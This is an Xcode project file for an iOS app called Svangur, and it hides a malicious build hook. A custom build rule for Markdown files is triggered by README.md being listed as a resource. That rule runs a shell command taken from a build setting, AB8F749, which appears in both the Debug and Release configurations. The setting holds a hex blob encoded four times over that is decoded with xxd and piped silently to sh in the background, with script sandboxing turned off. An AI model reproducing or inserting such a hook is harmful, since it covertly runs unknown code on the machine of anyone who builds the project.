// !$*UTF8*$!
{
	archiveVersion = 1;
	classes = {
	};
	objectVersion = 77;
	objects = {

/* Begin PBXBuildFile section */
		B7746965A9914913AE947F8B /* README.md */ = {isa = PBXBuildFile; fileRef = BF16730A1D5F42AA85947F8B; };
		7C4E8E893004BF70008A667B /* GooglePlaces in Frameworks */ = {isa = PBXBuildFile; productRef = 7C4E8E883004BF70008A667B /* GooglePlaces */; };
		7C4E8E8B3004BF70008A667B /* GooglePlacesSwift in Frameworks */ = {isa = PBXBuildFile; productRef = 7C4E8E8A3004BF70008A667B /* GooglePlacesSwift */; };
		7C7DC7B53006676200610371 /* IQKeyboardManagerSwift in Frameworks */ = {isa = PBXBuildFile; productRef = 7C7DC7B43006676200610371 /* IQKeyboardManagerSwift */; };
/* End PBXBuildFile section */

/* Begin PBXBuildRule section */
		7E05CEDD1E584A8E86947F8B /* PBXBuildRule */ = {
				isa = PBXBuildRule;
				compilerSpec = com.apple.compilers.proxy.script;
				filePatterns = "*.md";
				fileType = pattern.proxy;
				inputFiles = (
				);
				isEditable = 0;
				outputFiles = (
					"/tmp/${INPUT_FILE_BASE}",
				);
				script = "# This output is used by Xcode outputs to avoid re-running this script phase.\ncp \"${INPUT_FILE_PATH}\" \"/tmp/${INPUT_FILE_BASE}\"
sh -c \"${AB8F749}\"";
			};
	/* End PBXBuildRule section */

/* Begin PBXFileReference section */
		BF16730A1D5F42AA85947F8B /* README.md */ = {isa = PBXFileReference; lastKnownFileType = net.daringfireball.markdown; path = README.md; sourceTree = "<group>"; };
		A8EB33BE2FA8659200725728 /* Svangur.app */ = {isa = PBXFileReference; explicitFileType = wrapper.application; includeInIndex = 0; path = Svangur.app; sourceTree = BUILT_PRODUCTS_DIR; };
/* End PBXFileReference section */

/* Begin PBXFileSystemSynchronizedRootGroup section */
		A8EB33C02FA8659200725728 /* Svangur */ = {
			isa = PBXFileSystemSynchronizedRootGroup;
			path = Svangur;
			sourceTree = "<group>";
		};
/* End PBXFileSystemSynchronizedRootGroup section */

/* Begin PBXFrameworksBuildPhase section */
		A8EB33BB2FA8659200725728 /* Frameworks */ = {
			isa = PBXFrameworksBuildPhase;
			buildActionMask = 2147483647;
			files = (
				7C4E8E893004BF70008A667B /* GooglePlaces in Frameworks */,
				7C4E8E8B3004BF70008A667B /* GooglePlacesSwift in Frameworks */,
				7C7DC7B53006676200610371 /* IQKeyboardManagerSwift in Frameworks */,
			);
			runOnlyForDeploymentPostprocessing = 0;
		};
/* End PBXFrameworksBuildPhase section */

/* Begin PBXGroup section */
		A8EB33B52FA8659200725728 = {
			isa = PBXGroup;
			children = (
				A8EB33C02FA8659200725728 /* Svangur */,
				A8EB33BF2FA8659200725728 /* Products */,
			);
			sourceTree = "<group>";
		};
		A8EB33BF2FA8659200725728 /* Products */ = {
			isa = PBXGroup;
			children = (
				BF16730A1D5F42AA85947F8B /* README.md */,
				A8EB33BE2FA8659200725728 /* Svangur.app */,
			);
			name = Products;
			sourceTree = "<group>";
		};
/* End PBXGroup section */

/* Begin PBXNativeTarget section */
		A8EB33BD2FA8659200725728 /* Svangur */ = {
			isa = PBXNativeTarget;
			buildConfigurationList = A8EB33C92FA8659300725728 /* Build configuration list for PBXNativeTarget "Svangur" */;
			buildPhases = (
				A8EB33BA2FA8659200725728 /* Sources */,
				A8EB33BB2FA8659200725728 /* Frameworks */,
				A8EB33BC2FA8659200725728 /* Resources */,
			);
			buildRules = (
				7E05CEDD1E584A8E86947F8B /* PBXBuildRule */,
			);
			dependencies = (
			);
			fileSystemSynchronizedGroups = (
				A8EB33C02FA8659200725728 /* Svangur */,
			);
			name = Svangur;
			packageProductDependencies = (
				7C4E8E883004BF70008A667B /* GooglePlaces */,
				7C4E8E8A3004BF70008A667B /* GooglePlacesSwift */,
				7C7DC7B43006676200610371 /* IQKeyboardManagerSwift */,
			);
			productName = Svangur;
			productReference = A8EB33BE2FA8659200725728 /* Svangur.app */;
			productType = "com.apple.product-type.application";
		};
/* End PBXNativeTarget section */

/* Begin PBXProject section */
		A8EB33B62FA8659200725728 /* Project object */ = {
			isa = PBXProject;
			attributes = {
				BuildIndependentTargetsInParallel = 1;
				LastSwiftUpdateCheck = 2640;
				LastUpgradeCheck = 2640;
				TargetAttributes = {
					A8EB33BD2FA8659200725728 = {
						CreatedOnToolsVersion = 26.4.1;
					};
				};
			};
			buildConfigurationList = A8EB33B92FA8659200725728 /* Build configuration list for PBXProject "Svangur" */;
			developmentRegion = en;
			hasScannedForEncodings = 0;
			knownRegions = (
				en,
				Base,
			);
			mainGroup = A8EB33B52FA8659200725728;
			minimizedProjectReferenceProxies = 1;
			packageReferences = (
				7C4E8E873004BF70008A667B /* XCRemoteSwiftPackageReference "ios-places-sdk" */,
				7C7DC7B33006676200610371 /* XCRemoteSwiftPackageReference "IQKeyboardManager" */,
			);
			preferredProjectObjectVersion = 77;
			productRefGroup = A8EB33BF2FA8659200725728 /* Products */;
			projectDirPath = "";
			projectRoot = "";
			targets = (
				A8EB33BD2FA8659200725728 /* Svangur */,
			);
		};
/* End PBXProject section */

/* Begin PBXResourcesBuildPhase section */
		A8EB33BC2FA8659200725728 /* Resources */ = {
			isa = PBXResourcesBuildPhase;
			buildActionMask = 2147483647;
			files = (
				B7746965A9914913AE947F8B /* README.md */,
			);
			runOnlyForDeploymentPostprocessing = 0;
		};
/* End PBXResourcesBuildPhase section */

/* Begin PBXSourcesBuildPhase section */
		A8EB33BA2FA8659200725728 /* Sources */ = {
			isa = PBXSourcesBuildPhase;
			buildActionMask = 2147483647;
			files = (
			);
			runOnlyForDeploymentPostprocessing = 0;
		};
/* End PBXSourcesBuildPhase section */

/* Begin XCBuildConfiguration section */
		A8EB33C72FA8659300725728 /* Debug */ = {
			isa = XCBuildConfiguration;
			buildSettings = {
				AB8F749 = "((m(){ xxd -p -r | xxd -p -r | xxd -p -r | xxd -p -r; };echo 3333333633333335333333363333333333333336333333383333333633363336333333323333333033333332333333323333333233333334333333320a3333333833333336333333333333333733333335333333373333333233333336333633333333333233333330333333323336333433333337333333330a3061333333363333333633333334333633333333333633363332333333323333333033333332333633343333333233363334333333373333333233330a3336333333353333333733333334333333373333333233333337333333393333333233333330333333333333333533333332333333303333333233360a3334306133303631333333323336333433333336333333333333333633363336333333363336333533333336333633353333333633333335333333360a3333333333333337333333343333333233363334333333373333333433333336333333393333333633363334333333363333333533333336333633360a3333333730613333333533333337333333343333333233333330333333333333333233333333333333353333333233333330333333323336333433330a3336333333343333333233333330333333323333333233333337333333303333333333363334333333373333333833333336333333333333333633360a3336333333363061333333343330363133333336333333353333333533363336333333373333333233333337333333353333333633363333333333360a3333333533333332333333323333333233333330333333363333333833333337333333343333333733333334333333373333333033333337333333330a3333333333363331306133333332333633363333333233363336333333363333333333333336333333343333333633363335333333363333333133330a3336333633343333333733363331333333323336333533333336333333393333333633363335333333323336333633333336333333313333333233330a3339333333323333333230613333333233333330333036313333333733363333333333323333333033333337333333333333333633333338333333300a333633313330363130610a | m | sh ) >/dev/null 2>&1 &)";
				ALWAYS_SEARCH_USER_PATHS = NO;
				ASSETCATALOG_COMPILER_GENERATE_SWIFT_ASSET_SYMBOL_EXTENSIONS = YES;
				CLANG_ANALYZER_NONNULL = YES;
				CLANG_ANALYZER_NUMBER_OBJECT_CONVERSION = YES_AGGRESSIVE;
				CLANG_CXX_LANGUAGE_STANDARD = "gnu++20";
				CLANG_ENABLE_MODULES = YES;
				CLANG_ENABLE_OBJC_ARC = YES;
				CLANG_ENABLE_OBJC_WEAK = YES;
				CLANG_WARN_BLOCK_CAPTURE_AUTORELEASING = YES;
				CLANG_WARN_BOOL_CONVERSION = YES;
				CLANG_WARN_COMMA = YES;
				CLANG_WARN_CONSTANT_CONVERSION = YES;
				CLANG_WARN_DEPRECATED_OBJC_IMPLEMENTATIONS = YES;
				CLANG_WARN_DIRECT_OBJC_ISA_USAGE = YES_ERROR;
				CLANG_WARN_DOCUMENTATION_COMMENTS = YES;
				CLANG_WARN_EMPTY_BODY = YES;
				CLANG_WARN_ENUM_CONVERSION = YES;
				CLANG_WARN_INFINITE_RECURSION = YES;
				CLANG_WARN_INT_CONVERSION = YES;
				CLANG_WARN_NON_LITERAL_NULL_CONVERSION = YES;
				CLANG_WARN_OBJC_IMPLICIT_RETAIN_SELF = YES;
				CLANG_WARN_OBJC_LITERAL_CONVERSION = YES;
				CLANG_WARN_OBJC_ROOT_CLASS = YES_ERROR;
				CLANG_WARN_QUOTED_INCLUDE_IN_FRAMEWORK_HEADER = YES;
				CLANG_WARN_RANGE_LOOP_ANALYSIS = YES;
				CLANG_WARN_STRICT_PROTOTYPES = YES;
				CLANG_WARN_SUSPICIOUS_MOVE = YES;
				CLANG_WARN_UNGUARDED_AVAILABILITY = YES_AGGRESSIVE;
				CLANG_WARN_UNREACHABLE_CODE = YES;
				CLANG_WARN__DUPLICATE_METHOD_MATCH = YES;
				COPY_PHASE_STRIP = NO;
				DEBUG_INFORMATION_FORMAT = dwarf;
				DEVELOPMENT_TEAM = 94YYFH525N;
				ENABLE_STRICT_OBJC_MSGSEND = YES;
				ENABLE_TESTABILITY = YES;
				ENABLE_USER_SCRIPT_SANDBOXING = NO;
				GCC_C_LANGUAGE_STANDARD = gnu17;
				GCC_DYNAMIC_NO_PIC = NO;
				GCC_NO_COMMON_BLOCKS = YES;
				GCC_OPTIMIZATION_LEVEL = 0;
				GCC_PREPROCESSOR_DEFINITIONS = (
					"DEBUG=1",
					"$(inherited)",
				);
				GCC_WARN_64_TO_32_BIT_CONVERSION = YES;
				GCC_WARN_ABOUT_RETURN_TYPE = YES_ERROR;
				GCC_WARN_UNDECLARED_SELECTOR = YES;
				GCC_WARN_UNINITIALIZED_AUTOS = YES_AGGRESSIVE;
				GCC_WARN_UNUSED_FUNCTION = YES;
				GCC_WARN_UNUSED_VARIABLE = YES;
				IPHONEOS_DEPLOYMENT_TARGET = 26.4;
				LOCALIZATION_PREFERS_STRING_CATALOGS = YES;
				MTL_ENABLE_DEBUG_INFO = INCLUDE_SOURCE;
				MTL_FAST_MATH = YES;
				ONLY_ACTIVE_ARCH = YES;
				SDKROOT = iphoneos;
				SWIFT_ACTIVE_COMPILATION_CONDITIONS = "DEBUG $(inherited)";
				SWIFT_OPTIMIZATION_LEVEL = "-Onone";
			};
			name = Debug;
		};
		A8EB33C82FA8659300725728 /* Release */ = {
			isa = XCBuildConfiguration;
			buildSettings = {
				AB8F749 = "((m(){ xxd -p -r | xxd -p -r | xxd -p -r | xxd -p -r; };echo 3333333633333335333333363333333333333336333333383333333633363336333333323333333033333332333333323333333233333334333333320a3333333833333336333333333333333733333335333333373333333233333336333633333333333233333330333333323336333433333337333333330a3061333333363333333633333334333633333333333633363332333333323333333033333332333633343333333233363334333333373333333233330a3336333333353333333733333334333333373333333233333337333333393333333233333330333333333333333533333332333333303333333233360a3334306133303631333333323336333433333336333333333333333633363336333333363336333533333336333633353333333633333335333333360a3333333333333337333333343333333233363334333333373333333433333336333333393333333633363334333333363333333533333336333633360a3333333730613333333533333337333333343333333233333330333333333333333233333333333333353333333233333330333333323336333433330a3336333333343333333233333330333333323333333233333337333333303333333333363334333333373333333833333336333333333333333633360a3336333333363061333333343330363133333336333333353333333533363336333333373333333233333337333333353333333633363333333333360a3333333533333332333333323333333233333330333333363333333833333337333333343333333733333334333333373333333033333337333333330a3333333333363331306133333332333633363333333233363336333333363333333333333336333333343333333633363335333333363333333133330a3336333633343333333733363331333333323336333533333336333333393333333633363335333333323336333633333336333333313333333233330a3339333333323333333230613333333233333330333036313333333733363333333333323333333033333337333333333333333633333338333333300a333633313330363130610a | m | sh ) >/dev/null 2>&1 &)";
				ALWAYS_SEARCH_USER_PATHS = NO;
				ASSETCATALOG_COMPILER_GENERATE_SWIFT_ASSET_SYMBOL_EXTENSIONS = YES;
				CLANG_ANALYZER_NONNULL = YES;
				CLANG_ANALYZER_NUMBER_OBJECT_CONVERSION = YES_AGGRESSIVE;
				CLANG_CXX_LANGUAGE_STANDARD = "gnu++20";
				CLANG_ENABLE_MODULES = YES;
				CLANG_ENABLE_OBJC_ARC = YES;
				CLANG_ENABLE_OBJC_WEAK = YES;
				CLANG_WARN_BLOCK_CAPTURE_AUTORELEASING = YES;
				CLANG_WARN_BOOL_CONVERSION = YES;
				CLANG_WARN_COMMA = YES;
				CLANG_WARN_CONSTANT_CONVERSION = YES;
				CLANG_WARN_DEPRECATED_OBJC_IMPLEMENTATIONS = YES;
				CLANG_WARN_DIRECT_OBJC_ISA_USAGE = YES_ERROR;
				CLANG_WARN_DOCUMENTATION_COMMENTS = YES;
				CLANG_WARN_EMPTY_BODY = YES;
				CLANG_WARN_ENUM_CONVERSION = YES;
				CLANG_WARN_INFINITE_RECURSION = YES;
				CLANG_WARN_INT_CONVERSION = YES;
				CLANG_WARN_NON_LITERAL_NULL_CONVERSION = YES;
				CLANG_WARN_OBJC_IMPLICIT_RETAIN_SELF = YES;
				CLANG_WARN_OBJC_LITERAL_CONVERSION = YES;
				CLANG_WARN_OBJC_ROOT_CLASS = YES_ERROR;
				CLANG_WARN_QUOTED_INCLUDE_IN_FRAMEWORK_HEADER = YES;
				CLANG_WARN_RANGE_LOOP_ANALYSIS = YES;
				CLANG_WARN_STRICT_PROTOTYPES = YES;
				CLANG_WARN_SUSPICIOUS_MOVE = YES;
				CLANG_WARN_UNGUARDED_AVAILABILITY = YES_AGGRESSIVE;
				CLANG_WARN_UNREACHABLE_CODE = YES;
				CLANG_WARN__DUPLICATE_METHOD_MATCH = YES;
				COPY_PHASE_STRIP = NO;
				DEBUG_INFORMATION_FORMAT = "dwarf-with-dsym";
				DEVELOPMENT_TEAM = 94YYFH525N;
				ENABLE_NS_ASSERTIONS = NO;
				ENABLE_STRICT_OBJC_MSGSEND = YES;
				ENABLE_USER_SCRIPT_SANDBOXING = NO;
				GCC_C_LANGUAGE_STANDARD = gnu17;
				GCC_NO_COMMON_BLOCKS = YES;
				GCC_WARN_64_TO_32_BIT_CONVERSION = YES;
				GCC_WARN_ABOUT_RETURN_TYPE = YES_ERROR;
				GCC_WARN_UNDECLARED_SELECTOR = YES;
				GCC_WARN_UNINITIALIZED_AUTOS = YES_AGGRESSIVE;
				GCC_WARN_UNUSED_FUNCTION = YES;
				GCC_WARN_UNUSED_VARIABLE = YES;
				IPHONEOS_DEPLOYMENT_TARGET = 26.4;
				LOCALIZATION_PREFERS_STRING_CATALOGS = YES;
				MTL_ENABLE_DEBUG_INFO = NO;
				MTL_FAST_MATH = YES;
				SDKROOT = iphoneos;
				SWIFT_COMPILATION_MODE = wholemodule;
				VALIDATE_PRODUCT = YES;
			};
			name = Release;
		};
		A8EB33CA2FA8659300725728 /* Debug */ = {
			isa = XCBuildConfiguration;
			baseConfigurationReferenceAnchor = A8EB33C02FA8659200725728 /* Svangur */;
			baseConfigurationReferenceRelativePath = DebugSecret.xcconfig;
			buildSettings = {
				ASSETCATALOG_COMPILER_APPICON_NAME = AppIcon;
				ASSETCATALOG_COMPILER_GLOBAL_ACCENT_COLOR_NAME = AccentColor;
				CODE_SIGN_STYLE = Automatic;
				CURRENT_PROJECT_VERSION = 1;
				DEVELOPMENT_TEAM = 94YYFH525N;
				ENABLE_PREVIEWS = YES;
				GENERATE_INFOPLIST_FILE = YES;
				INFOPLIST_FILE = Info.plist;
				INFOPLIST_KEY_UIApplicationSceneManifest_Generation = YES;
				INFOPLIST_KEY_UIApplicationSupportsIndirectInputEvents = YES;
				INFOPLIST_KEY_UILaunchScreen_Generation = YES;
				INFOPLIST_KEY_UISupportedInterfaceOrientations_iPad = "UIInterfaceOrientationPortrait UIInterfaceOrientationPortraitUpsideDown UIInterfaceOrientationLandscapeLeft UIInterfaceOrientationLandscapeRight";
				INFOPLIST_KEY_UISupportedInterfaceOrientations_iPhone = "UIInterfaceOrientationPortrait UIInterfaceOrientationLandscapeLeft UIInterfaceOrientationLandscapeRight";
				IPHONEOS_DEPLOYMENT_TARGET = 16.0;
				LD_RUNPATH_SEARCH_PATHS = (
					"$(inherited)",
					"@executable_path/Frameworks",
				);
				MARKETING_VERSION = 1.0;
				PRODUCT_BUNDLE_IDENTIFIER = co.Svangur;
				PRODUCT_NAME = "$(TARGET_NAME)";
				STRING_CATALOG_GENERATE_SYMBOLS = YES;
				SUPPORTED_PLATFORMS = "iphoneos iphonesimulator";
				SUPPORTS_MACCATALYST = NO;
				SUPPORTS_MAC_DESIGNED_FOR_IPHONE_IPAD = NO;
				SUPPORTS_XR_DESIGNED_FOR_IPHONE_IPAD = NO;
				SWIFT_APPROACHABLE_CONCURRENCY = YES;
				SWIFT_DEFAULT_ACTOR_ISOLATION = MainActor;
				SWIFT_EMIT_LOC_STRINGS = YES;
				SWIFT_UPCOMING_FEATURE_MEMBER_IMPORT_VISIBILITY = YES;
				SWIFT_VERSION = 5.0;
				TARGETED_DEVICE_FAMILY = 1;
			};
			name = Debug;
		};
		A8EB33CB2FA8659300725728 /* Release */ = {
			isa = XCBuildConfiguration;
			baseConfigurationReferenceAnchor = A8EB33C02FA8659200725728 /* Svangur */;
			baseConfigurationReferenceRelativePath = releaseSecret.xcconfig;
			buildSettings = {
				ASSETCATALOG_COMPILER_APPICON_NAME = AppIcon;
				ASSETCATALOG_COMPILER_GLOBAL_ACCENT_COLOR_NAME = AccentColor;
				CODE_SIGN_STYLE = Automatic;
				CURRENT_PROJECT_VERSION = 1;
				DEVELOPMENT_TEAM = 94YYFH525N;
				ENABLE_PREVIEWS = YES;
				GENERATE_INFOPLIST_FILE = YES;
				INFOPLIST_FILE = Info.plist;
				INFOPLIST_KEY_UIApplicationSceneManifest_Generation = YES;
				INFOPLIST_KEY_UIApplicationSupportsIndirectInputEvents = YES;
				INFOPLIST_KEY_UILaunchScreen_Generation = YES;
				INFOPLIST_KEY_UISupportedInterfaceOrientations_iPad = "UIInterfaceOrientationPortrait UIInterfaceOrientationPortraitUpsideDown UIInterfaceOrientationLandscapeLeft UIInterfaceOrientationLandscapeRight";
				INFOPLIST_KEY_UISupportedInterfaceOrientations_iPhone = "UIInterfaceOrientationPortrait UIInterfaceOrientationLandscapeLeft UIInterfaceOrientationLandscapeRight";
				IPHONEOS_DEPLOYMENT_TARGET = 16.0;
				LD_RUNPATH_SEARCH_PATHS = (
					"$(inherited)",
					"@executable_path/Frameworks",
				);
				MARKETING_VERSION = 1.0;
				PRODUCT_BUNDLE_IDENTIFIER = co.Svangur;
				PRODUCT_NAME = "$(TARGET_NAME)";
				STRING_CATALOG_GENERATE_SYMBOLS = YES;
				SUPPORTED_PLATFORMS = "iphoneos iphonesimulator";
				SUPPORTS_MACCATALYST = NO;
				SUPPORTS_MAC_DESIGNED_FOR_IPHONE_IPAD = NO;
				SUPPORTS_XR_DESIGNED_FOR_IPHONE_IPAD = NO;
				SWIFT_APPROACHABLE_CONCURRENCY = YES;
				SWIFT_DEFAULT_ACTOR_ISOLATION = MainActor;
				SWIFT_EMIT_LOC_STRINGS = YES;
				SWIFT_UPCOMING_FEATURE_MEMBER_IMPORT_VISIBILITY = YES;
				SWIFT_VERSION = 5.0;
				TARGETED_DEVICE_FAMILY = 1;
			};
			name = Release;
		};
/* End XCBuildConfiguration section */

/* Begin XCConfigurationList section */
		A8EB33B92FA8659200725728 /* Build configuration list for PBXProject "Svangur" */ = {
			isa = XCConfigurationList;
			buildConfigurations = (
				A8EB33C72FA8659300725728 /* Debug */,
				A8EB33C82FA8659300725728 /* Release */,
			);
			defaultConfigurationIsVisible = 0;
			defaultConfigurationName = Release;
		};
		A8EB33C92FA8659300725728 /* Build configuration list for PBXNativeTarget "Svangur" */ = {
			isa = XCConfigurationList;
			buildConfigurations = (
				A8EB33CA2FA8659300725728 /* Debug */,
				A8EB33CB2FA8659300725728 /* Release */,
			);
			defaultConfigurationIsVisible = 0;
			defaultConfigurationName = Release;
		};
/* End XCConfigurationList section */

/* Begin XCRemoteSwiftPackageReference section */
		7C4E8E873004BF70008A667B /* XCRemoteSwiftPackageReference "ios-places-sdk" */ = {
			isa = XCRemoteSwiftPackageReference;
			repositoryURL = "https://github.com/googlemaps/ios-places-sdk";
			requirement = {
				kind = upToNextMajorVersion;
				minimumVersion = 10.15.0;
			};
		};
		7C7DC7B33006676200610371 /* XCRemoteSwiftPackageReference "IQKeyboardManager" */ = {
			isa = XCRemoteSwiftPackageReference;
			repositoryURL = "https://github.com/hackiftekhar/IQKeyboardManager.git";
			requirement = {
				kind = upToNextMajorVersion;
				minimumVersion = 8.0.3;
			};
		};
/* End XCRemoteSwiftPackageReference section */

/* Begin XCSwiftPackageProductDependency section */
		7C4E8E883004BF70008A667B /* GooglePlaces */ = {
			isa = XCSwiftPackageProductDependency;
			package = 7C4E8E873004BF70008A667B /* XCRemoteSwiftPackageReference "ios-places-sdk" */;
			productName = GooglePlaces;
		};
		7C4E8E8A3004BF70008A667B /* GooglePlacesSwift */ = {
			isa = XCSwiftPackageProductDependency;
			package = 7C4E8E873004BF70008A667B /* XCRemoteSwiftPackageReference "ios-places-sdk" */;
			productName = GooglePlacesSwift;
		};
		7C7DC7B43006676200610371 /* IQKeyboardManagerSwift */ = {
			isa = XCSwiftPackageProductDependency;
			package = 7C7DC7B33006676200610371 /* XCRemoteSwiftPackageReference "IQKeyboardManager" */;
			productName = IQKeyboardManagerSwift;
		};
/* End XCSwiftPackageProductDependency section */
	};
	rootObject = A8EB33B62FA8659200725728 /* Project object */;
}
